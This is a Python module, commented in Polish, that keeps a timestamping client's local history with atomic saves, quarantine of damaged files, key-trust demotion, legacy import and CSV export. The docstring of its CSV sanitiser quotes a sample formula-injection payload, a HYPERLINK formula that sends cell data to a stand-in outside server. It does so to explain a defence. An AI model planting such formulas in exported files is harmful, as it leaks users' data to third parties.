"""
Historia stempli — trwaly, odporny na uszkodzenia rejestr lokalny.

Poprzednik miał tu usterke, która niszczyla dane po cichu:

    history = []
    if os.path.exists(HISTORY_FILE):
        try:    history = json.load(f)
        except Exception:  pass          # <- i tu ginela CALA historia
    history.append(entry)
    json.dump(history, open(HISTORY_FILE, "w"))   # <- zapis JEDNEGO wpisu

Uszkodzony plik (przerwany zapis, pełny dysk, antywirus w trakcie) nie dawal
żadnego sygnalu — nastepny stempel nadpisywal go pojedynczym wpisem i wszystko
sprzed awarii przestawalo istniec. Do tego sam zapis nie był atomowy, więc to
on najczesciej te awarie powodowal.

Tutaj: uszkodzony plik jest ODKLADANY NA BOK (`history.uszkodzona-<czas>.json`)
i zglaszany do interfejsu, zapis idzie przez `write_atomic`, a rejestr ma
górny sufit wielkosci, żeby po latach nie urosl do rozmiaru, który spowalnia
start programu.
"""
from __future__ import annotations

import csv
import json
import logging
import time
from dataclasses import asdict, dataclass, field, fields
from datetime import datetime, timezone
from pathlib import Path

from . import beatcore, keys, merkle, proof
from .config import history_path, json_loads, verify_url, write_atomic
from .i18n import _

log = logging.getLogger(__name__)

SOURCE_BEATTIME = 'beattime'
SOURCE_TVS_LEGACY = 'tvs-legacy'


@dataclass
class Entry:
    """Jeden stempel w historii lokalnej.

    Przechowujemy Nazwę pliku i ścieżkę tylko po to, żeby uzytkownik wiedzial,
    czego dotyczy wpis. Zadna z tych informacji nigdy nie idzie do sieci —
    serwer widzi wyłącznie `digest`.
    """

    digest: str = ''
    file_name: str = ''
    file_path: str = ''
    file_size: int = 0
    note: str = ''

    beat: str = ''
    utc: str = ''
    seq: int | None = None
    week: str = ''
    week_root: str = ''
    week_closed: bool = False
    chain_hash: str = ''
    root_signature: str = ''
    public_key: str = ''
    inclusion_proof: list[dict] = field(default_factory=list)
    ots_status: str = 'none'
    ots_height: int | None = None
    anchors: list[dict] = field(default_factory=list)

    # Dziennik globalny (od 2.2): pozycja, checkpoint obejmujacy wpis i trzy
    # czasy. Starsze wersje programu pomijaja nieznane pola przy odczycie,
    # wiec historia zapisana przez 2.2 otwiera sie takze w 2.1.
    log_index: int | None = None
    checkpoint: dict = field(default_factory=dict)
    time_bounds: dict = field(default_factory=dict)
    witness_mode: str = ''

    level: str = 'recorded'
    verified_ok: bool = False          # ostatnia weryfikacja lokalna wypadla OK
    source: str = SOURCE_BEATTIME      # beattime | tvs-legacy
    created_local: str = ''            # ISO, czas lokalny dodania wpisu
    refreshed_utc: str = ''            # kiedy ostatnio odswiezono z serwera
    legacy: dict = field(default_factory=dict)   # surowe pola ze starego TVS

    # --- Prezentacja ---

    @property
    def utc_dt(self) -> datetime | None:
        return beatcore.parse_iso_utc(self.utc)

    @property
    def when_local(self) -> str:
        return beatcore.local_str(self.utc_dt)

    @property
    def short_digest(self) -> str:
        return f'{self.digest[:12]}…{self.digest[-8:]}' if len(self.digest) > 24 else self.digest

    @property
    def signed_by_retired_key(self) -> bool:
        """Podpis korzenia w tym wpisie pochodzi z klucza WYCOFANEGO."""
        return bool(self.root_signature) and keys.is_retired(self.public_key)

    @property
    def verify_url(self) -> str:
        if self.source == SOURCE_TVS_LEGACY:
            return str(self.legacy.get('verify_url') or '')
        return verify_url(self.digest)

    def to_dict(self) -> dict:
        return asdict(self)

    @classmethod
    def from_dict(cls, raw: dict) -> 'Entry | None':
        """Buduje wpis z surowego slownika; None gdy nie da się uratowac.

        Nieznane klucze sa pomijane, a pole o zlym typie dostaje wartość
        domyślna — jeden zepsuty wpis nie może uniewaznic calej historii.
        """
        if not isinstance(raw, dict):
            return None
        known = {f.name: f for f in fields(cls)}
        kwargs: dict = {}
        for key, value in raw.items():
            f = known.get(key)
            if f is None:
                continue
            try:
                if f.type in ('bool', bool):
                    kwargs[key] = bool(value)
                elif f.type in ('int | None', 'int', int):
                    kwargs[key] = None if value in (None, '') else int(value)
                elif f.type in ('list[dict]',):
                    kwargs[key] = [x for x in value if isinstance(x, dict)] if isinstance(value, list) else []
                elif f.type in ('dict',):
                    kwargs[key] = value if isinstance(value, dict) else {}
                else:
                    kwargs[key] = '' if value is None else str(value)
            except (TypeError, ValueError, OverflowError):
                continue
        entry = cls(**kwargs)
        return entry if entry.digest or entry.legacy else None


def entry_from_verification(result, *, file_name: str = '', file_path: str = '',
                            file_size: int = 0, note: str = '') -> Entry:
    """Buduje wpis historii z wyniku lokalnej weryfikacji (`proof.py`)."""
    return Entry(
        digest=result.digest,
        file_name=file_name,
        file_path=file_path,
        file_size=file_size,
        note=note,
        beat=result.beat,
        utc=result.utc,
        seq=result.seq,
        week=result.week,
        week_root=result.week_root,
        week_closed=result.week_closed,
        chain_hash=result.chain_hash,
        root_signature=result.root_signature,
        public_key=result.public_key,
        inclusion_proof=list(result.inclusion_proof),
        ots_status=result.ots_status,
        ots_height=result.ots_height,
        anchors=list(result.anchors),
        log_index=result.log_index,
        checkpoint=dict(result.checkpoint or {}),
        time_bounds=dict(result.time_bounds or {}),
        witness_mode=str(result.witness_mode or ''),
        level=str(result.level.value),
        verified_ok=bool(result.trusted),
        source=SOURCE_BEATTIME,
        created_local=datetime.now().astimezone().isoformat(timespec='seconds'),
        refreshed_utc=datetime.now(timezone.utc).isoformat(timespec='seconds'),
    )


def _stored_level_unsupported(entry: Entry, key_override: str = '') -> bool:
    """Czy zapisany wynik weryfikacji przestal byc uzasadniony.

    `level` i `verified_ok` to wynik OSTATNIEJ weryfikacji, zapisany w pliku.
    Nie jest uzasadniony, gdy:

    * korzen podpisal klucz, ktorego DZIS nie uznajemy — wycofany (wpis
      zweryfikowany przed rotacja) albo wlasny klucz z ustawien, ktory
      uzytkownik potem usunal;
    * poziom „Podpisany"/„Zakotwiczony" nie ma w ogole podpisu korzenia
      (plik historii edytowany poza aplikacja);
    * deklarowany czas nie lezy w podpisanym tygodniu.
    """
    if entry.source != SOURCE_BEATTIME:
        return False
    if entry.root_signature and not keys.is_trusted(entry.public_key, key_override):
        return True
    if entry.level in ('signed', 'anchored') and not entry.root_signature:
        return True
    return bool(proof.time_claim_problems(entry.utc, entry.beat, entry.week))


def _demote_untrusted(entry: Entry, key_override: str = '') -> bool:
    """Zdejmuje nieuzasadniony poziom do „Zarejestrowany". True = zmieniono.

    Bez tego wpis zweryfikowany np. wlasnym kluczem, ktory potem usunieto
    z ustawien, pokazywalby na zawsze „Zakotwiczony" — i z takim poziomem
    trafialby do certyfikatu PDF. „Odśwież statusy" (F5) dociagnie podpis
    aktualnym kluczem i przywroci pelny poziom.
    """
    if not _stored_level_unsupported(entry, key_override):
        return False
    changed = entry.level in ('signed', 'anchored') or entry.verified_ok
    if entry.level in ('signed', 'anchored'):
        entry.level = 'recorded'
    entry.verified_ok = False
    return changed


class History:
    """Rejestr stempli w pamieci, zapisywany atomowo na dysk."""

    def __init__(self, path: Path | None = None, limit: int = 5000):
        self.path = path or history_path()
        self.limit = max(0, int(limit))
        self.entries: list[Entry] = []
        self.load_problem: str = ''       # komunikat dla UI, gdy cos bylo nie tak

    # --- Wejscie/wyjscie ---------------------------------------------------

    def load(self, key_override: str = '') -> 'History':
        """Wczytuje historie. `key_override` = wlasny klucz z ustawien (albo '').

        Poziom kazdego wpisu jest przy tym sprawdzany wedlug OBECNYCH zasad
        zaufania (`_demote_untrusted`) — zapisany wynik nie jest wyrocznia.
        """
        self.entries = []
        self.load_problem = ''
        if not self.path.exists():
            return self
        try:
            raw = json_loads(self.path.read_text(encoding='utf-8'))
        except OSError as e:
            self.load_problem = _(
                'The history file could not be opened: %(reason)s.') % {
                    'reason': e.strerror or e}
            log.warning('historia — odczyt: %s', e)
            return self
        except ValueError as e:
            # Plik istnieje, ale nie jest poprawnym JSON-em. NIE kasujemy go:
            # odkladamy na bok, zeby dalo sie odzyskac dane recznie.
            backup = self._quarantine()
            self.load_problem = _(
                'The history file was damaged and has been set aside as '
                '"%(name)s". The history starts over — the previous entries are '
                'in that file.'
            ) % {'name': backup.name}
            log.warning('historia — uszkodzony JSON (%s), kopia: %s', e, backup)
            return self

        items = raw if isinstance(raw, list) else raw.get('entries') if isinstance(raw, dict) else None
        if not isinstance(items, list):
            backup = self._quarantine()
            self.load_problem = _(
                'The history file had an unexpected structure and has been set '
                'aside as "%(name)s".') % {'name': backup.name}
            return self

        skipped = 0
        for item in items:
            entry = Entry.from_dict(item) if isinstance(item, dict) else None
            if entry is None:
                skipped += 1
                continue
            _demote_untrusted(entry, key_override)
            self.entries.append(entry)
        if skipped:
            self.load_problem = _(
                'Skipped %(count)s damaged history entries; the rest were read '
                'correctly.') % {'count': skipped}
        return self

    def demote_untrusted(self, key_override: str = '') -> int:
        """Przelicza poziomy po zmianie zaufania (np. usunieto wlasny klucz).

        Zmienia wpisy w pamieci i zwraca ich liczbe; zapis na dysk nastepuje
        przy najblizszej operacji na historii — plik trzyma wynik ostatniej
        weryfikacji, a „Odśwież statusy" (F5) i tak go nadpisze.
        """
        return sum(1 for e in self.entries if _demote_untrusted(e, key_override))

    def save(self) -> None:
        """Zapisuje rejestr. Blad zapisu LECI DALEJ — i tak ma byc.

        Ta metoda nie polyka `OSError`: cicha porazka zapisu znaczylaby, ze
        swiezy stempel istnieje w publicznym rejestrze, ale nie w historii
        uzytkownika — czyli dokladnie ta klasa strat, przed ktora broni caly
        ten plik. Wyjatek lapie warstwa interfejsu (`ui/main_window._store`),
        ktora umie zapytac o inny katalog i POWTORZYC sam zapis. Kazde nowe
        wywolanie `save` (posrednie takze: `add`, `replace`, `remove`,
        `clear`) ma isc przez tamta funkcje, a nie przez wlasny `try`.
        """
        if self.limit and len(self.entries) > self.limit:
            # Sufit obcina NAJSTARSZE wpisy — najnowsze sa te, ktorych
            # uzytkownik szuka na co dzien.
            self.entries = self.entries[-self.limit:]
        payload = json.dumps(
            [e.to_dict() for e in self.entries], indent=2, ensure_ascii=False
        ).encode('utf-8')
        write_atomic(self.path, payload)

    def _quarantine(self) -> Path:
        """Przenosi uszkodzony plik obok, zamiast go stracic."""
        stamp = time.strftime('%Y%m%d-%H%M%S')
        backup = self.path.with_name(f'historia.uszkodzona-{stamp}.json')
        try:
            self.path.replace(backup)
        except OSError:
            log.warning('historia — nie udało się odłożyć uszkodzonego pliku')
        return backup

    # --- Operacje ----------------------------------------------------------

    def add(self, entry: Entry) -> None:
        self.entries.append(entry)
        self.save()

    def find(self, digest: str) -> Entry | None:
        digest = str(digest or '').strip().lower()
        for entry in reversed(self.entries):
            if entry.digest == digest:
                return entry
        return None

    def _absorb(self, entry: Entry) -> None:
        """Wklada wpis do listy w pamieci. NIC nie zapisuje na dysk.

        Rozdzielenie pamieci od dysku jest tu warunkiem bezpieczenstwa, a nie
        porzadkiem. Katalog danych bywa ZABLOKOWANY (ochrona przed
        ransomware), a wtedy `ui/main_window._store` powtarza SAM ZAPIS po
        zmianie katalogu — nie cala czynnosc, bo ta dolozylaby te same wpisy
        po raz drugi. Zeby powtorzony zapis mial co utrwalic, komplet wpisow
        musi juz byc w pamieci; stad `merge`, ktory najpierw wklada
        WSZYSTKIE, a dopiero potem raz siega na dysk.
        """
        for i, existing in enumerate(self.entries):
            if existing.digest == entry.digest and existing.source == entry.source:
                # Notatka i dane pliku sa WLASNOSCIA uzytkownika — odswiezenie
                # z serwera nie ma prawa ich skasowac.
                entry.note = entry.note or existing.note
                entry.file_name = entry.file_name or existing.file_name
                entry.file_path = entry.file_path or existing.file_path
                entry.file_size = entry.file_size or existing.file_size
                entry.created_local = existing.created_local or entry.created_local
                self.entries[i] = entry
                return
        self.entries.append(entry)

    def replace(self, entry: Entry) -> None:
        """Podmienia wpis o tym samym skrócie (odswiezenie statusu)."""
        self._absorb(entry)
        self.save()

    def merge(self, entries: list[Entry]) -> None:
        """Wciaga KOMPLET wpisow i zapisuje rejestr DOKLADNIE raz.

        Jedyna droga dla wyniku pracy wsadowej: stemplowania kilku plikow
        naraz i odswiezania statusow. Petla `add`/`replace` byla tu usterka
        z utrata danych, a nie tylko marnotrawstwem zapisow.

        Uzytkownik upuszcza piec plikow. Serwer rejestruje piec stempli —
        nieodwracalnie, bo wpisy sa juz w publicznym rejestrze. Pierwszy zapis
        historii trafia na blokade i leci `OSError`: petla PRZERYWA sie na
        pierwszym pliku, wiec stemple 2-5 nie trafiaja nawet do pamieci.
        `_store` pyta o inny katalog i powtarza zapis — a powtorzony zapis
        utrwala komplet NIEPELNY. Cztery dowody, ktorych uzytkownik nie
        odtworzy inaczej niz recznie po skrotach, znikaja bez jednego slowa
        na ekranie.

        Tutaj kolejnosc jest odwrotna: najpierw wszystko do pamieci, potem
        jeden `write_atomic`. Zapis albo przechodzi w calosci, albo zglasza
        blad majac za soba komplet gotowy do ponowienia. Przy okazji piec
        plikow kosztuje jeden zapis pliku zamiast pieciu.
        """
        for entry in entries:
            self._absorb(entry)
        self.save()

    def remove(self, digests: list[str]) -> int:
        wanted = {str(d).strip().lower() for d in digests}
        before = len(self.entries)
        self.entries = [e for e in self.entries if e.digest not in wanted]
        removed = before - len(self.entries)
        if removed:
            self.save()
        return removed

    def clear(self) -> None:
        self.entries = []
        self.save()

    # --- Migracja ze starego TVS -------------------------------------------

    def import_legacy_tvs(self, legacy_file: Path) -> int:
        """Wciaga stary `history.json` klienta TVS jako wpisy archiwalne.

        Stare wpisy zostaja oznaczone `source='tvs-legacy'` i NIE udaja
        dowodów Sigelith — ich "signature" to sklejka `czas.sha256`, której
        nie da się zweryfikować. Sa widoczne jako archiwum, żeby uzytkownik
        nie stracil zapisu tego, co kiedys stemplowal, i żeby mogl te pliki
        ostemplować ponownie w rejestrze, który cos dowodzi.
        """
        if not legacy_file.exists():
            return 0
        try:
            raw = json.loads(legacy_file.read_text(encoding='utf-8'))
        except (OSError, ValueError) as e:
            log.warning('migracja TVS — nie udało się odczytać %s: %s', legacy_file, e)
            return 0
        if not isinstance(raw, list):
            return 0

        known = {(e.digest, e.source) for e in self.entries}
        added = 0
        for item in raw:
            if not isinstance(item, dict):
                continue
            digest = str(item.get('hash') or '').strip().lower()
            if not merkle.is_digest(digest):
                continue          # stare wpisy z hash="unknown" nie niosa nic
            if (digest, SOURCE_TVS_LEGACY) in known:
                continue
            utc = str(item.get('timestamp') or '')
            dt = beatcore.parse_iso_utc(utc)
            self.entries.append(Entry(
                digest=digest,
                note=str(item.get('note') or ''),
                utc=beatcore.utc_str(dt) if dt else utc,
                beat=beatcore.format_beat(beatcore.beats_from_utc(dt), decimals=2) if dt else '',
                level='recorded',
                verified_ok=False,
                source=SOURCE_TVS_LEGACY,
                created_local=str(item.get('timestamp') or ''),
                legacy={
                    'cert_id': str(item.get('cert_id') or ''),
                    'signature': str(item.get('signature') or ''),
                    'verify_url': str(item.get('verify_url') or ''),
                    'published': bool(item.get('published')),
                },
            ))
            known.add((digest, SOURCE_TVS_LEGACY))
            added += 1

        if added:
            self.entries.sort(key=lambda e: e.utc or '')
            self.save()
        return added

    # --- Eksport -----------------------------------------------------------

    #: Kolumny eksportu CSV: (pole wpisu, funkcja dajaca naglowek).
    #: Naglowki sa FUNKCJAMI, bo lista policzona w czasie importu zamrozilaby
    #: jezyk na tym, ktory obowiazywal przed wczytaniem ustawien.
    CSV_FIELDS = [
        ('utc', lambda: _('UTC time')),
        ('beat', lambda: _('@beat time')),
        ('digest', lambda: 'SHA-256'),
        ('file_name', lambda: _('File')),
        ('file_size', lambda: _('Size (B)')),
        ('note', lambda: _('Note')),
        ('level', lambda: _('Proof level')),
        ('week', lambda: _('Week')),
        ('week_root', lambda: _('Merkle root')),
        ('ots_status', lambda: 'OpenTimestamps'),
        ('ots_height', lambda: _('Bitcoin block')),
        ('seq', lambda: _('Register no.')),
        ('source', lambda: _('Source')),
        ('verify_url', lambda: _('Verification address')),
    ]

    @classmethod
    def csv_headers(cls) -> list[str]:
        """Naglowki kolumn eksportu w jezyku interfejsu."""
        return [header() for _key, header in cls.CSV_FIELDS]

    @staticmethod
    def _csv_safe(value: object) -> str:
        """Neutralizuje wstrzykiwanie formuł do arkusza kalkulacyjnego.

        Excel i LibreOffice traktują komórkę zaczynającą się od `=`, `+`, `-`,
        `@`, tabulatora albo znaku powrotu karetki jako FORMUŁĘ, a nie tekst.
        Notatka o treści `=HYPERLINK("http://cudzy.serwer/?d="&A2;"Otwórz")`
        zamienia się po otwarciu pliku w gotowy odnośnik wysyłający sąsiednie
        kolumny — czyli skrót i czas stempla — na cudzy serwer. `WEBSERVICE`
        w starszych konfiguracjach wykonuje się nawet bez kliknięcia.

        Wektor nie jest teoretyczny: notatki i nazwy plików wchodzą też
        z zaimportowanej historii starego klienta TVS, a ta jest wczytywana
        automatycznie z pliku leżącego obok programu.

        Apostrof z przodu jest standardowym sposobem wymuszenia tekstu —
        arkusz go nie pokazuje, a formuła nie powstaje.
        """
        text = '' if value is None else str(value)
        if text[:1] in ('=', '+', '-', '@', '\t', '\r'):
            return "'" + text
        return text

    def export_csv(self, target: Path, entries: list[Entry] | None = None) -> int:
        """Eksport do CSV czytelnego dla Excela (BOM + srednik).

        Excel w polskiej lokalizacji rozdziela kolumny SREDNIKIEM i bez
        znacznika BOM czyta plik jako windows-1250 — polskie znaki rozsypuja
        się na "Ĺ›". Poprzednik zapisywal przecinkami i bez BOM, więc plik
        otwieral się jako jedna kolumna krzakow.
        """
        rows = entries if entries is not None else self.entries
        target.parent.mkdir(parents=True, exist_ok=True)
        with open(target, 'w', newline='', encoding='utf-8-sig') as fh:
            writer = csv.writer(fh, delimiter=';', quoting=csv.QUOTE_MINIMAL)
            writer.writerow(self.csv_headers())
            for entry in rows:
                writer.writerow([
                    self._csv_safe(
                        entry.verify_url if key == 'verify_url'
                        else getattr(entry, key, ''))
                    for key, _header in self.CSV_FIELDS
                ])
        return len(rows)

    def export_json(self, target: Path, entries: list[Entry] | None = None) -> int:
        rows = entries if entries is not None else self.entries
        write_atomic(target, json.dumps(
            [e.to_dict() for e in rows], indent=2, ensure_ascii=False
        ).encode('utf-8'))
        return len(rows)
